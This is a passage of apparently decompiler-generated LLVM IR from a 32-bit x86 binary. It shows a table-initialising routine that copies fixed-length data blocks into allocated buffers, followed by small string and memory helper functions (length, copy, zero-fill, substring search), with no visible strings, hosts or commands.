  store i32 %v1_8051071, i32* @ebx, align 4
  %v4_8051083 = call i32 @function_8051540(i32 %v1_8051071, i32 ptrtoint (i32* @global_var_80546bf.123 to i32), i32 16)
  %v0_8051088 = load i32, i32* @ebx, align 4
  store i32 %v0_8051088, i32* @global_var_80566f8.124, align 8
  store i16 16, i16* bitcast (i32* @global_var_80566fc.125 to i16*), align 4
  %v1_805109e = call i32 @function_8052414(i32 22)
  store i32 %v1_805109e, i32* @ebx, align 4
  %v4_80510b0 = call i32 @function_8051540(i32 %v1_805109e, i32 ptrtoint (i32* @global_var_80546d0.126 to i32), i32 22)
  %v0_80510b5 = load i32, i32* @ebx, align 4
  store i32 %v0_80510b5, i32* @global_var_8056700.127, align 256
  store i16 22, i16* bitcast (i32* @global_var_8056704.128 to i16*), align 4
  %v1_80510cb = call i32 @function_8052414(i32 21)
  store i32 %v1_80510cb, i32* @ebx, align 4
  %v4_80510dd = call i32 @function_8051540(i32 %v1_80510cb, i32 ptrtoint (i32* @global_var_80546e7.129 to i32), i32 21)
  %v0_80510e2 = load i32, i32* @ebx, align 4
  store i32 %v0_80510e2, i32* @global_var_8056708.130, align 8
  store i16 21, i16* bitcast (i32* @global_var_805670c.131 to i16*), align 4
  %v1_80510f8 = call i32 @function_8052414(i32 17)
  store i32 %v1_80510f8, i32* @ebx, align 4
  %v4_805110a = call i32 @function_8051540(i32 %v1_80510f8, i32 ptrtoint ([18 x i8]* @global_var_80546fd.132 to i32), i32 17)
  %v0_805110f = load i32, i32* @ebx, align 4
  store i32 %v0_805110f, i32* @global_var_8056710.133, align 16
  store i16 17, i16* bitcast (i32* @global_var_8056714.134 to i16*), align 4
  %v1_8051125 = call i32 @function_8052414(i32 12)
  store i32 %v1_8051125, i32* @ebx, align 4
  %v4_8051137 = call i32 @function_8051540(i32 %v1_8051125, i32 ptrtoint (i32* @global_var_805470f.135 to i32), i32 12)
  %v0_805113c = load i32, i32* @ebx, align 4
  store i32 %v0_805113c, i32* @global_var_8056718.136, align 8
  store i16 12, i16* bitcast (i32* @global_var_805671c.137 to i16*), align 4
  %v1_8051152 = call i32 @function_8052414(i32 23)
  store i32 %v1_8051152, i32* @ebx, align 4
  %v4_8051164 = call i32 @function_8051540(i32 %v1_8051152, i32 ptrtoint (i32* @global_var_805471c.138 to i32), i32 23)
  %v0_8051169 = load i32, i32* @ebx, align 4
  store i32 %v0_8051169, i32* @global_var_8056720.139, align 32
  store i16 23, i16* bitcast (i32* @global_var_8056724.140 to i16*), align 4
  %v1_805117f = call i32 @function_8052414(i32 83)
  store i32 %v1_805117f, i32* @ebx, align 4
  %v4_8051191 = call i32 @function_8051540(i32 %v1_805117f, i32 ptrtoint (i32* @global_var_80547f0.141 to i32), i32 83)
  %v0_8051196 = load i32, i32* @ebx, align 4
  store i32 %v0_8051196, i32* @global_var_8056728.142, align 8
  store i16 83, i16* bitcast (i32* @global_var_805672c.143 to i16*), align 4
  %v1_80511ac = call i32 @function_8052414(i32 32)
  store i32 %v1_80511ac, i32* @ebx, align 4
  %v4_80511be = call i32 @function_8051540(i32 %v1_80511ac, i32 ptrtoint (i32* @global_var_8054844.144 to i32), i32 32)
  %v0_80511c3 = load i32, i32* @ebx, align 4
  store i32 %v0_80511c3, i32* @global_var_8056730.145, align 16
  store i16 32, i16* bitcast (i32* @global_var_8056734.146 to i16*), align 4
  %v1_80511d9 = call i32 @function_8052414(i32 48)
  store i32 %v1_80511d9, i32* @ebx, align 4
  %v4_80511eb = call i32 @function_8051540(i32 %v1_80511d9, i32 ptrtoint (i32* @global_var_8054868.147 to i32), i32 48)
  %v0_80511f0 = load i32, i32* @ebx, align 4
  store i32 %v0_80511f0, i32* @global_var_8056738.148, align 8
  store i16 48, i16* bitcast (i32* @global_var_805673c.149 to i16*), align 4
  %v1_8051206 = call i32 @function_8052414(i32 12)
  store i32 %v1_8051206, i32* @ebx, align 4
  %v4_8051218 = call i32 @function_8051540(i32 %v1_8051206, i32 ptrtoint (i32* @global_var_8054734.150 to i32), i32 12)
  %v0_805121d = load i32, i32* @ebx, align 4
  store i32 %v0_805121d, i32* @global_var_8056740.151, align 64
  store i16 12, i16* bitcast (i32* @global_var_8056744.152 to i16*), align 4
  %v1_8051233 = call i32 @function_8052414(i32 9)
  store i32 %v1_8051233, i32* @ebx, align 4
  %v4_8051245 = call i32 @function_8051540(i32 %v1_8051233, i32 ptrtoint (i32* @global_var_8054741.153 to i32), i32 9)
  %v0_805124a = load i32, i32* @ebx, align 4
  store i32 %v0_805124a, i32* @global_var_8056748.154, align 8
  store i16 9, i16* bitcast (i32* @global_var_805674c.155 to i16*), align 4
  %v1_8051260 = call i32 @function_8052414(i32 10)
  store i32 %v1_8051260, i32* @ebx, align 4
  %v4_8051272 = call i32 @function_8051540(i32 %v1_8051260, i32 ptrtoint (i32* @global_var_805474b.156 to i32), i32 10)
  %v0_8051277 = load i32, i32* @ebx, align 4
  store i32 %v0_8051277, i32* @global_var_8056750.157, align 16
  store i16 10, i16* bitcast (i32* @global_var_8056754.158 to i16*), align 4
  %v1_805128d = call i32 @function_8052414(i32 12)
  store i32 %v1_805128d, i32* @ebx, align 4
  %v4_805129f = call i32 @function_8051540(i32 %v1_805128d, i32 ptrtoint (i32* @global_var_8054756.159 to i32), i32 12)
  %v0_80512a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80512a4, i32* @global_var_8056758.160, align 8
  store i16 12, i16* bitcast (i32* @global_var_805675c.161 to i16*), align 4
  %v1_80512ba = call i32 @function_8052414(i32 16)
  store i32 %v1_80512ba, i32* @ebx, align 4
  %v4_80512cc = call i32 @function_8051540(i32 %v1_80512ba, i32 ptrtoint (i32* @global_var_8054763.162 to i32), i32 16)
  %v0_80512d1 = load i32, i32* @ebx, align 4
  store i32 %v0_80512d1, i32* @global_var_8056760.163, align 32
  store i16 16, i16* bitcast (i32* @global_var_8056764.164 to i16*), align 4
  %v1_80512e7 = call i32 @function_8052414(i32 19)
  store i32 %v1_80512e7, i32* @ebx, align 4
  %v4_80512f9 = call i32 @function_8051540(i32 %v1_80512e7, i32 ptrtoint (i32* @global_var_8054774.165 to i32), i32 19)
  %v0_80512fe = load i32, i32* @ebx, align 4
  store i32 %v0_80512fe, i32* @global_var_8056768.166, align 8
  store i16 19, i16* bitcast (i32* @global_var_805676c.167 to i16*), align 4
  %v1_8051314 = call i32 @function_8052414(i32 8)
  store i32 %v1_8051314, i32* @ebx, align 4
  %v4_8051326 = call i32 @function_8051540(i32 %v1_8051314, i32 ptrtoint ([9 x i8]* @global_var_8054788.168 to i32), i32 8)
  %v0_805132b = load i32, i32* @ebx, align 4
  store i32 %v0_805132b, i32* @global_var_8056770.169, align 16
  store i16 8, i16* bitcast (i32* @global_var_8056774.170 to i16*), align 4
  %v1_8051341 = call i32 @function_8052414(i32 11)
  store i32 %v1_8051341, i32* @ebx, align 4
  %v4_8051353 = call i32 @function_8051540(i32 %v1_8051341, i32 ptrtoint (i32* @global_var_8054728.171 to i32), i32 11)
  %v0_8051358 = load i32, i32* @ebx, align 4
  store i32 %v0_8051358, i32* @global_var_8056778.172, align 8
  store i16 11, i16* bitcast (i32* @global_var_805677c.173 to i16*), align 4
  %v1_805136e = call i32 @function_8052414(i32 12)
  store i32 %v1_805136e, i32* @ebx, align 4
  %v4_8051380 = call i32 @function_8051540(i32 %v1_805136e, i32 ptrtoint (i32* @global_var_8054791.174 to i32), i32 12)
  %v0_8051385 = load i32, i32* @ebx, align 4
  store i32 %v0_8051385, i32* @global_var_8056780.175, align 128
  store i16 12, i16* bitcast (i32* @global_var_8056784.176 to i16*), align 4
  %v1_805139b = call i32 @function_8052414(i32 18)
  store i32 %v1_805139b, i32* @ebx, align 4
  %v4_80513ad = call i32 @function_8051540(i32 %v1_805139b, i32 ptrtoint (i32* @global_var_805479e.177 to i32), i32 18)
  %v0_80513b2 = load i32, i32* @ebx, align 4
  store i32 %v0_80513b2, i32* @global_var_8056788.178, align 8
  store i16 18, i16* bitcast (i32* @global_var_805678c.179 to i16*), align 4
  %v1_80513c8 = call i32 @function_8052414(i32 25)
  store i32 %v1_80513c8, i32* @ebx, align 4
  %v4_80513da = call i32 @function_8051540(i32 %v1_80513c8, i32 ptrtoint (i32* @global_var_80547b1.180 to i32), i32 25)
  %v0_80513df = load i32, i32* @ebx, align 4
  store i32 %v0_80513df, i32* @global_var_8056790.181, align 16
  store i16 25, i16* bitcast (i32* @global_var_8056794.182 to i16*), align 4
  %v1_80513f5 = call i32 @function_8052414(i32 111)
  store i32 %v1_80513f5, i32* @ebx, align 4
  %v4_8051407 = call i32 @function_8051540(i32 %v1_80513f5, i32 ptrtoint (i32* @global_var_805489c.183 to i32), i32 111)
  %v0_805140c = load i32, i32* @ebx, align 4
  store i32 %v0_805140c, i32* @global_var_8056798.184, align 8
  store i16 111, i16* bitcast (i32* @global_var_805679c.185 to i16*), align 4
  %v1_8051422 = call i32 @function_8052414(i32 111)
  store i32 %v1_8051422, i32* @ebx, align 4
  %v4_8051434 = call i32 @function_8051540(i32 %v1_8051422, i32 ptrtoint (i32* @global_var_805490c.186 to i32), i32 111)
  %v0_8051439 = load i32, i32* @ebx, align 4
  store i32 %v0_8051439, i32* @global_var_80567a0.187, align 32
  store i16 111, i16* bitcast (i32* @global_var_80567a4.188 to i16*), align 4
  %v1_805144f = call i32 @function_8052414(i32 110)
  store i32 %v1_805144f, i32* @ebx, align 4
  %v4_8051461 = call i32 @function_8051540(i32 %v1_805144f, i32 ptrtoint (i32* @global_var_805497c.189 to i32), i32 110)
  %v0_8051466 = load i32, i32* @ebx, align 4
  store i32 %v0_8051466, i32* @global_var_80567a8.190, align 8
  store i16 110, i16* bitcast (i32* @global_var_80567ac.191 to i16*), align 4
  %v1_805147c = call i32 @function_8052414(i32 110)
  store i32 %v1_805147c, i32* @ebx, align 4
  %v4_805148e = call i32 @function_8051540(i32 %v1_805147c, i32 ptrtoint (i32* @global_var_80549ec.192 to i32), i32 110)
  %v0_8051493 = load i32, i32* @ebx, align 4
  store i32 %v0_8051493, i32* @global_var_80567b0.193, align 16
  store i16 110, i16* bitcast (i32* @global_var_80567b4.194 to i16*), align 4
  %v1_80514a9 = call i32 @function_8052414(i32 117)
  store i32 %v1_80514a9, i32* @ebx, align 4
  %v4_80514bb = call i32 @function_8051540(i32 %v1_80514a9, i32 ptrtoint (i32* @global_var_8054a5c.195 to i32), i32 117)
  %v0_80514c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80514c0, i32* @global_var_80567b8.196, align 8
  store i16 117, i16* bitcast (i32* @global_var_80567bc.197 to i16*), align 4
  ret i32 %v4_80514bb

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_8051540, { 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_80514e0(i8* %arg1) local_unnamed_addr {
dec_label_pc_80514e0:
  %v4_80514e0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80514e0, i32* @edx, align 4
  %v2_80514e6 = load i8, i8* %arg1, align 1
  %v3_80514e6 = icmp eq i8 %v2_80514e6, 0
  br i1 %v3_80514e6, label %dec_label_pc_80514f7, label %dec_label_pc_80514f0

dec_label_pc_80514f0:                             ; preds = %dec_label_pc_80514e0, %dec_label_pc_80514f0
  %v0_80514f0 = phi i32 [ %v1_80514f0, %dec_label_pc_80514f0 ], [ 0, %dec_label_pc_80514e0 ]
  %v1_80514f0 = add i32 %v0_80514f0, 1
  %v2_80514f1 = add i32 %v1_80514f0, %v4_80514e0
  %v3_80514f1 = inttoptr i32 %v2_80514f1 to i8*
  %v4_80514f1 = load i8, i8* %v3_80514f1, align 1
  %v5_80514f1 = icmp eq i8 %v4_80514f1, 0
  %v1_80514f5 = icmp eq i1 %v5_80514f1, false
  br i1 %v1_80514f5, label %dec_label_pc_80514f0, label %dec_label_pc_80514f7

dec_label_pc_80514f7:                             ; preds = %dec_label_pc_80514f0, %dec_label_pc_80514e0
  %v0_80514f7 = phi i32 [ 0, %dec_label_pc_80514e0 ], [ %v1_80514f0, %dec_label_pc_80514f0 ]
  ret i32 %v0_80514f7

; uselistorder directives
  uselistorder label %dec_label_pc_80514f0, { 1, 0 }
}

define i32 @function_8051500(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051500:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp16 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051501 = load i32, i32* @ebx, align 4
  store i32 %v0_8051501, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v4_8051506 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051506, i32* %edx.global-to-local, align 4
  %v2_805150a = load i8, i8* %tmp16, align 1
  %v3_805150a = icmp eq i8 %v2_805150a, 0
  br i1 %v3_805150a, label %dec_label_pc_8051534, label %dec_label_pc_805150f

dec_label_pc_805150f:                             ; preds = %dec_label_pc_8051500
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051511

dec_label_pc_8051511:                             ; preds = %dec_label_pc_8051511, %dec_label_pc_805150f
  %v0_8051511 = phi i32 [ %v1_8051511, %dec_label_pc_8051511 ], [ 0, %dec_label_pc_805150f ]
  %v1_8051511 = add i32 %v0_8051511, 1
  store i32 %v1_8051511, i32* %esi.global-to-local, align 4
  %v2_8051512 = add i32 %v1_8051511, %arg2
  %v3_8051512 = inttoptr i32 %v2_8051512 to i8*
  %v4_8051512 = load i8, i8* %v3_8051512, align 1
  %v5_8051512 = icmp eq i8 %v4_8051512, 0
  %v1_8051516 = icmp eq i1 %v5_8051512, false
  br i1 %v1_8051516, label %dec_label_pc_8051511, label %dec_label_pc_8051518

dec_label_pc_8051518:                             ; preds = %dec_label_pc_8051511
  %v10_8051518 = icmp eq i32 %v0_8051511, -2
  br i1 %v10_8051518, label %dec_label_pc_805152f, label %dec_label_pc_805151d

dec_label_pc_805151d:                             ; preds = %dec_label_pc_8051518
  store i32 %v4_8051506, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v1_8051511, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051523

dec_label_pc_8051523:                             ; preds = %dec_label_pc_8051534, %dec_label_pc_805151d, %dec_label_pc_8051523.dec_label_pc_8051523_crit_edge
  %v2_8051526 = phi i32 [ %v1_8051529, %dec_label_pc_8051523.dec_label_pc_8051523_crit_edge ], [ %v4_8051506, %dec_label_pc_805151d ], [ %v4_8051506, %dec_label_pc_8051534 ]
  %v0_8051525 = phi i32 [ %v0_805152a, %dec_label_pc_8051523.dec_label_pc_8051523_crit_edge ], [ %v1_8051511, %dec_label_pc_805151d ], [ 0, %dec_label_pc_8051534 ]
  %v4_8051523 = phi i32 [ %v4_8051523.pre, %dec_label_pc_8051523.dec_label_pc_8051523_crit_edge ], [ %arg2, %dec_label_pc_805151d ], [ %arg2, %dec_label_pc_8051534 ]
  %v0_8051523 = phi i32 [ %v1_8051528, %dec_label_pc_8051523.dec_label_pc_8051523_crit_edge ], [ %arg2, %dec_label_pc_805151d ], [ %arg2, %dec_label_pc_8051534 ]
  %v1_8051523 = inttoptr i32 %v0_8051523 to i8*
  %v2_8051523 = load i8, i8* %v1_8051523, align 1
  %v3_8051523 = zext i8 %v2_8051523 to i32
  %v5_8051523 = and i32 %v4_8051523, -256
  %v6_8051523 = or i32 %v3_8051523, %v5_8051523
  store i32 %v6_8051523, i32* %eax.global-to-local, align 4
  %v1_8051525 = add i32 %v0_8051525, -1
  store i32 %v1_8051525, i32* %edx.global-to-local, align 4
  %v3_8051526 = inttoptr i32 %v2_8051526 to i8*
  store i8 %v2_8051523, i8* %v3_8051526, align 1
  %v0_8051528 = load i32, i32* @ecx, align 4
  %v1_8051528 = add i32 %v0_8051528, 1
  store i32 %v1_8051528, i32* @ecx, align 4
  %v0_8051529 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051529 = add i32 %v0_8051529, 1
  store i32 %v1_8051529, i32* %ebx.global-to-local, align 4
  %v0_805152a = load i32, i32* %edx.global-to-local, align 4
  %v10_805152a = icmp eq i32 %v0_805152a, -1
  %v1_805152d = icmp eq i1 %v10_805152a, false
  br i1 %v1_805152d, label %dec_label_pc_8051523.dec_label_pc_8051523_crit_edge, label %dec_label_pc_805152f.loopexit

dec_label_pc_8051523.dec_label_pc_8051523_crit_edge: ; preds = %dec_label_pc_8051523
  %v4_8051523.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051523

dec_label_pc_805152f.loopexit:                    ; preds = %dec_label_pc_8051523
  %v0_805152f.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051531.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805152f

dec_label_pc_805152f:                             ; preds = %dec_label_pc_805152f.loopexit, %dec_label_pc_8051518
  %v2_8051531 = phi i32 [ %v2_8051531.pre, %dec_label_pc_805152f.loopexit ], [ %v0_8051501, %dec_label_pc_8051518 ]
  %v0_805152f = phi i32 [ %v0_805152f.pre, %dec_label_pc_805152f.loopexit ], [ %v1_8051511, %dec_label_pc_8051518 ]
  store i32 %v0_805152f, i32* %eax.global-to-local, align 4
  store i32 %v2_8051531, i32* @ebx, align 4
  ret i32 %v0_805152f

dec_label_pc_8051534:                             ; preds = %dec_label_pc_8051500
  store i32 %v4_8051506, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051523

; uselistorder directives
  uselistorder i32 %v0_805152f, { 1, 0 }
  uselistorder i32 %v1_8051529, { 1, 0 }
  uselistorder i32 %v1_8051528, { 1, 0 }
  uselistorder i32 %v1_8051511, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v4_8051506, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_8051523, { 0, 2, 1 }
}

define i32 @function_8051540(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051540:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051541 = load i32, i32* @ebx, align 4
  store i32 %v0_8051541, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_805154e = icmp eq i32 %arg3, 0
  br i1 %v1_805154e, label %dec_label_pc_805155f, label %dec_label_pc_8051552

dec_label_pc_8051552:                             ; preds = %dec_label_pc_8051540
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_805155411 = inttoptr i32 %arg2 to i8*
  %v4_805155412 = load i8, i8* %v3_805155411, align 1
  %v6_805155714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_805155412, i8* %v6_805155714, align 1
  %v0_805155a15 = load i32, i32* %edx.global-to-local, align 4
  %v1_805155a16 = add i32 %v0_805155a15, 1
  store i32 %v1_805155a16, i32* %edx.global-to-local, align 4
  %v12_805155b17 = icmp eq i32 %v1_805155a16, %arg3
  %v1_805155d18 = icmp eq i1 %v12_805155b17, false
  br i1 %v1_805155d18, label %dec_label_pc_8051554.dec_label_pc_8051554_crit_edge, label %dec_label_pc_805155f.loopexit

dec_label_pc_8051554.dec_label_pc_8051554_crit_edge: ; preds = %dec_label_pc_8051552, %dec_label_pc_8051554.dec_label_pc_8051554_crit_edge
  %v1_805155a20 = phi i32 [ %v1_805155a, %dec_label_pc_8051554.dec_label_pc_8051554_crit_edge ], [ %v1_805155a16, %dec_label_pc_8051552 ]
  %v1_8051554.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051557.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051554 = add i32 %v1_805155a20, %v1_8051554.pre
  %v3_8051554 = inttoptr i32 %v2_8051554 to i8*
  %v4_8051554 = load i8, i8* %v3_8051554, align 1
  %v5_8051557 = add i32 %v1_805155a20, %v4_8051557.pre
  %v6_8051557 = inttoptr i32 %v5_8051557 to i8*
  store i8 %v4_8051554, i8* %v6_8051557, align 1
  %v0_805155a = load i32, i32* %edx.global-to-local, align 4
  %v1_805155a = add i32 %v0_805155a, 1
  store i32 %v1_805155a, i32* %edx.global-to-local, align 4
  %v12_805155b = icmp eq i32 %v1_805155a, %arg3
  %v1_805155d = icmp eq i1 %v12_805155b, false
  br i1 %v1_805155d, label %dec_label_pc_8051554.dec_label_pc_8051554_crit_edge, label %dec_label_pc_805155f.loopexit

dec_label_pc_805155f.loopexit:                    ; preds = %dec_label_pc_8051554.dec_label_pc_8051554_crit_edge, %dec_label_pc_8051552
  %v4_8051554.lcssa = phi i8 [ %v4_805155412, %dec_label_pc_8051552 ], [ %v4_8051554, %dec_label_pc_8051554.dec_label_pc_8051554_crit_edge ]
  %phitmp = sext i8 %v4_8051554.lcssa to i32
  %v2_805155f.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805155f

dec_label_pc_805155f:                             ; preds = %dec_label_pc_805155f.loopexit, %dec_label_pc_8051540
  %v2_805155f = phi i32 [ %v0_8051541, %dec_label_pc_8051540 ], [ %v2_805155f.pre, %dec_label_pc_805155f.loopexit ]
  %.1 = phi i32 [ 0, %dec_label_pc_8051540 ], [ %phitmp, %dec_label_pc_805155f.loopexit ]
  store i32 %v2_805155f, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_805155a, { 1, 2, 0 }
  uselistorder i32 %v1_805155a20, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051554.dec_label_pc_8051554_crit_edge, { 1, 0 }
}

define i32 @function_8051570(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051570:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8051578 = icmp eq i32 %arg2, 0
  br i1 %v1_8051578, label %dec_label_pc_8051570.dec_label_pc_8051589_crit_edge, label %dec_label_pc_805157c

dec_label_pc_8051570.dec_label_pc_8051589_crit_edge: ; preds = %dec_label_pc_8051570
  %v0_8051589.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051589

dec_label_pc_805157c:                             ; preds = %dec_label_pc_8051570
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80515805 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_80515805, align 1
  %v0_80515846 = load i32, i32* %eax.global-to-local, align 4
  %v1_80515847 = add i32 %v0_80515846, 1
  store i32 %v1_80515847, i32* %eax.global-to-local, align 4
  %v12_80515858 = icmp eq i32 %v1_80515847, %arg2
  %v1_80515879 = icmp eq i1 %v12_80515858, false
  br i1 %v1_80515879, label %dec_label_pc_8051580.dec_label_pc_8051580_crit_edge, label %dec_label_pc_8051589

dec_label_pc_8051580.dec_label_pc_8051580_crit_edge: ; preds = %dec_label_pc_805157c, %dec_label_pc_8051580.dec_label_pc_8051580_crit_edge
  %v1_805158410 = phi i32 [ %v1_8051584, %dec_label_pc_8051580.dec_label_pc_8051580_crit_edge ], [ %v1_80515847, %dec_label_pc_805157c ]
  %v1_8051580.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051580 = add i32 %v1_805158410, %v1_8051580.pre
  %v3_8051580 = inttoptr i32 %v2_8051580 to i8*
  store i8 0, i8* %v3_8051580, align 1
  %v0_8051584 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051584 = add i32 %v0_8051584, 1
  store i32 %v1_8051584, i32* %eax.global-to-local, align 4
  %v12_8051585 = icmp eq i32 %v1_8051584, %arg2
  %v1_8051587 = icmp eq i1 %v12_8051585, false
  br i1 %v1_8051587, label %dec_label_pc_8051580.dec_label_pc_8051580_crit_edge, label %dec_label_pc_8051589

dec_label_pc_8051589:                             ; preds = %dec_label_pc_805157c, %dec_label_pc_8051580.dec_label_pc_8051580_crit_edge, %dec_label_pc_8051570.dec_label_pc_8051589_crit_edge
  %v0_8051589 = phi i32 [ %v0_8051589.pre, %dec_label_pc_8051570.dec_label_pc_8051589_crit_edge ], [ %v1_80515847, %dec_label_pc_805157c ], [ %v1_8051584, %dec_label_pc_8051580.dec_label_pc_8051580_crit_edge ]
  ret i32 %v0_8051589

; uselistorder directives
  uselistorder i32 %v1_8051584, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051589, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051580.dec_label_pc_8051580_crit_edge, { 1, 0 }
}

define i32 @function_8051590() local_unnamed_addr {
dec_label_pc_8051590:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* @ecx, align 4
  %v7_80515a5 = icmp sgt i32 %tmp9, %tmp10
  br i1 %v7_80515a5, label %dec_label_pc_80515a7, label %dec_label_pc_80515b0

dec_label_pc_80515a7:                             ; preds = %dec_label_pc_80515c2, %dec_label_pc_8051590, %dec_label_pc_80515b0
  br label %dec_label_pc_80515aa

dec_label_pc_80515aa:                             ; preds = %dec_label_pc_80515d5, %dec_label_pc_80515a7
  %storemerge = phi i32 [ -1, %dec_label_pc_80515a7 ], [ %v0_80515c3, %dec_label_pc_80515d5 ]
  ret i32 %storemerge

dec_label_pc_80515b0:                             ; preds = %dec_label_pc_8051590
  %tmp17 = icmp slt i32 %tmp10, 1
  br i1 %tmp17, label %dec_label_pc_80515a7, label %dec_label_pc_80515b4

dec_label_pc_80515b4:                             ; preds = %dec_label_pc_80515b0
  %v2_80515cc = add i32 %tmp, -1
  br label %dec_label_pc_80515c8

dec_label_pc_80515c0:                             ; preds = %dec_label_pc_80515c8
  br label %dec_label_pc_80515c2

dec_label_pc_80515c2:                             ; preds = %dec_label_pc_80515d5, %dec_label_pc_80515c0
  %v2_80515d03 = phi i32 [ %v1_80515d5, %dec_label_pc_80515d5 ], [ 0, %dec_label_pc_80515c0 ]
  %v1_80515c2 = add i32 %v0_80515c2, 1
  %v1_80515c3 = add i32 %v0_80515c3, 1
  %v12_80515c4 = icmp eq i32 %tmp10, %v1_80515c2
  br i1 %v12_80515c4, label %dec_label_pc_80515a7, label %dec_label_pc_80515c8

dec_label_pc_80515c8:                             ; preds = %dec_label_pc_80515c2, %dec_label_pc_80515b4
  %v0_80515c2 = phi i32 [ %v1_80515c2, %dec_label_pc_80515c2 ], [ 0, %dec_label_pc_80515b4 ]
  %v0_80515d5 = phi i32 [ %v2_80515d03, %dec_label_pc_80515c2 ], [ 0, %dec_label_pc_80515b4 ]
  %v0_80515c3 = phi i32 [ %v1_80515c3, %dec_label_pc_80515c2 ], [ 1, %dec_label_pc_80515b4 ]
  %v3_80515cc = add i32 %v2_80515cc, %v0_80515c3
  %v4_80515cc = inttoptr i32 %v3_80515cc to i8*
  %v5_80515cc = load i8, i8* %v4_80515cc, align 1
  %v4_80515d0 = add i32 %v0_80515d5, %tmp8
  %v5_80515d0 = inttoptr i32 %v4_80515d0 to i8*
  %v6_80515d0 = load i8, i8* %v5_80515d0, align 1
  %v17_80515d0 = icmp eq i8 %v5_80515cc, %v6_80515d0
  %v1_80515d3 = icmp eq i1 %v17_80515d0, false
  br i1 %v1_80515d3, label %dec_label_pc_80515c0, label %dec_label_pc_80515d5

dec_label_pc_80515d5:                             ; preds = %dec_label_pc_80515c8
  %v1_80515d5 = add i32 %v0_80515d5, 1
  %v12_80515d6 = icmp eq i32 %tmp9, %v1_80515d5
  %v1_80515d8 = icmp eq i1 %v12_80515d6, false
  br i1 %v1_80515d8, label %dec_label_pc_80515c2, label %dec_label_pc_80515aa

; uselistorder directives
  uselistorder i32 %v0_80515c3, { 2, 0, 1 }
  uselistorder i32 %v0_80515d5, { 1, 0 }
  uselistorder i32 %v1_80515c2, { 1, 0 }
  uselistorder label %dec_label_pc_80515a7, { 0, 2, 1 }
}

define i32 @function_80515e0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80515e0:
  %v4_80515e7 = ptrtoint i8* %arg1 to i32
  %v4_80515f0.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80515f0

dec_label_pc_80515f0:                             ; preds = %dec_label_pc_8051604, %dec_label_pc_8051600, %dec_label_pc_80515f0, %dec_label_pc_80515e0
  %v4_80515f0 = phi i32 [ %v4_80515f0.pre, %dec_label_pc_80515e0 ], [ %v6_80515f0, %dec_label_pc_80515f0 ], [ %v6_80515f0, %dec_label_pc_8051600 ], [ %v6_80515f0, %dec_label_pc_8051604 ]
  %v0_80515f2 = phi i32 [ %v4_80515e7, %dec_label_pc_80515e0 ], [ %v1_80515f2, %dec_label_pc_80515f0 ], [ %v1_80515f2, %dec_label_pc_8051600 ], [ %v1_80515f2, %dec_label_pc_8051604 ]
